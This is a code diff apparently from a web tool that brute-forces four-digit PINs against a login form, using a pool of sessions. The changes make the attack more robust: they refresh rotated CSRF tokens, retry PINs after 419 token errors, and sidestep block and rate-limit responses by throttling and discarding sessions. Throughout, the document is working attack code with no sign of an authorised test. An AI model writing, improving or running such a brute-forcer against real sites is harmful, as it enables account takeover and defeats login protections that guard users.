@@ -53,6 +53,7 @@ class WebBruteForcer:
         return len(self.session_pool) > 0
 
     def _new_session(self):
+        """Create a fresh session and fetch a valid CSRF token."""
         try:
             session = requests.Session()
             resp = session.get(self.url, timeout=8)
@@ -71,6 +72,26 @@ class WebBruteForcer:
         except Exception:
             pass
         return None
+
+    def refresh_csrf(self, session_data):
+        """
+        FIX 1: After a POST, read the server response and extract
+        a fresh CSRF token if the server rotated it.
+        Updates session_data in place.
+        """
+        try:
+            resp = session_data['session'].get(self.url, timeout=8)
+            soup = BeautifulSoup(resp.text, "html.parser")
+            csrf_element = soup.find("input", {"name": "_token"})
+            if csrf_element:
+                new_token = csrf_element["value"]
+                if new_token != session_data['csrf_token']:
+                    self.csrf_rotations += 1
+                    session_data['csrf_token'] = new_token
+                return True
+        except Exception:
+            pass
+        return False
 
     def get_session_from_pool(self):
         with self.pool_lock:
@@ -132,6 +153,7 @@ class WebBruteForcer:
 
         mpin_str = str(mpin).zfill(4)
 
+        # Get a session, retry up to 3 times
         session_data = None
         for _ in range(3):
             session_data = self.get_session_from_pool()
@@ -145,56 +167,90 @@ class WebBruteForcer:
             self.emit_progress('log', {'message': f'[WARN] Skipped PIN {mpin_str} -- no session', 'type': 'warn'})
             return None
 
-        try:
-            data = {
-                "username": self.username,
-                "password": mpin_str,
-                "_token": session_data['csrf_token']
-            }
-
-            t_start = time.time()
-            response = session_data['session'].post(self.url, data=data, timeout=8)
-            elapsed_req = time.time() - t_start
-            self.response_times.append(elapsed_req)
-
-            with self.attempts_lock:
-                self.attempts += 1
-                current_attempts = self.attempts
-
-            if current_attempts % 10 == 0:
-                elapsed = time.time() - self.start_time
-                self.emit_progress('progress', {
-                    'attempts': current_attempts,
-                    'current': mpin_str,
-                    'elapsed': round(elapsed, 1),
-                    'speed': round(current_attempts / elapsed, 2) if elapsed > 0 else 0
-                })
+        # FIX 2: Retry the same PIN up to 2 times on ambiguous/stale responses
+        max_pin_retries = 2
+        for pin_attempt in range(max_pin_retries + 1):
+            if self.found or self.stop_event.is_set():
+                return None
 
             try:
-                json_response = response.json()
-                if json_response.get("signal") == "success":
-                    self.found = True
-                    return mpin_str
-                elif "blocked" in str(json_response).lower() or "limit" in str(json_response).lower():
-                    self.block_hits += 1
-                    self.emit_progress('log', {'message': f'[BLOCK] Defense triggered: {json_response}', 'type': 'warn'})
-                    session_data = None
-                    time.sleep(2)
-            except Exception:
-                if response.status_code == 302:
-                    self.found = True
-                    return mpin_str
-                elif response.status_code == 429:
-                    self.rate_limit_hits += 1
-                    self.emit_progress('log', {'message': '[RATE] Rate limit hit -- throttling...', 'type': 'warn'})
-                    session_data = None
-                    time.sleep(3)
+                post_data = {
+                    "username": self.username,
+                    "password": mpin_str,
+                    "_token": session_data['csrf_token']
+                }
 
-        except Exception:
-            session_data = None
-        finally:
-            if session_data and not self.found and not self.stop_event.is_set():
-                self.return_session_to_pool(session_data)
+                t_start = time.time()
+                response = session_data['session'].post(self.url, data=post_data, timeout=8)
+                elapsed_req = time.time() - t_start
+                self.response_times.append(elapsed_req)
+
+                with self.attempts_lock:
+                    self.attempts += 1
+                    current_attempts = self.attempts
+
+                if current_attempts % 10 == 0:
+                    elapsed = time.time() - self.start_time
+                    self.emit_progress('progress', {
+                        'attempts': current_attempts,
+                        'current': mpin_str,
+                        'elapsed': round(elapsed, 1),
+                        'speed': round(current_attempts / elapsed, 2) if elapsed > 0 else 0
+                    })
+
+                # FIX 3: Handle 419 CSRF token mismatch -- refresh and retry
+                if response.status_code == 419:
+                    self.emit_progress('log', {'message': f'[CSRF] Token expired on {mpin_str} -- refreshing...', 'type': 'warn'})
+                    refreshed = self.refresh_csrf(session_data)
+                    if refreshed and pin_attempt < max_pin_retries:
+                        time.sleep(0.5)
+                        continue  # retry same PIN with fresh token
+                    else:
+                        # Could not refresh, discard session
+                        session_data = None
+                        break
+
+                try:
+                    json_response = response.json()
+                    if json_response.get("signal") == "success":
+                        self.found = True
+                        return mpin_str
+                    elif "blocked" in str(json_response).lower() or "limit" in str(json_response).lower():
+                        self.block_hits += 1
+                        self.emit_progress('log', {'message': f'[BLOCK] Defense triggered: {json_response}', 'type': 'warn'})
+                        session_data = None
+                        time.sleep(2)
+                        break
+                    else:
+                        # FIX 1: On any valid JSON failure response, refresh CSRF token
+                        # so next attempt from this session uses a fresh token
+                        self.refresh_csrf(session_data)
+                        break  # wrong PIN, move on
+
+                except Exception:
+                    if response.status_code == 302:
+                        self.found = True
+                        return mpin_str
+                    elif response.status_code == 429:
+                        self.rate_limit_hits += 1
+                        self.emit_progress('log', {'message': '[RATE] Rate limit hit -- throttling...', 'type': 'warn'})
+                        session_data = None
+                        time.sleep(3)
+                        break
+                    else:
+                        # Unknown status -- refresh token and retry
+                        if pin_attempt < max_pin_retries:
+                            self.refresh_csrf(session_data)
+                            time.sleep(0.3)
+                            continue
+                        break
+
+            except Exception:
+                session_data = None
+                break
+
+        if session_data and not self.found and not self.stop_event.is_set():
+            self.return_session_to_pool(session_data)
 
         return None
 
@@ -348,7 +404,6 @@ def handle_start(data):
         emit('error', {'message': 'URL and username are required'})
         return
 
-    # Parse custom PINs
     custom_pins = []
     if custom_raw:
         for p in custom_raw.replace(',', '\n').splitlines():
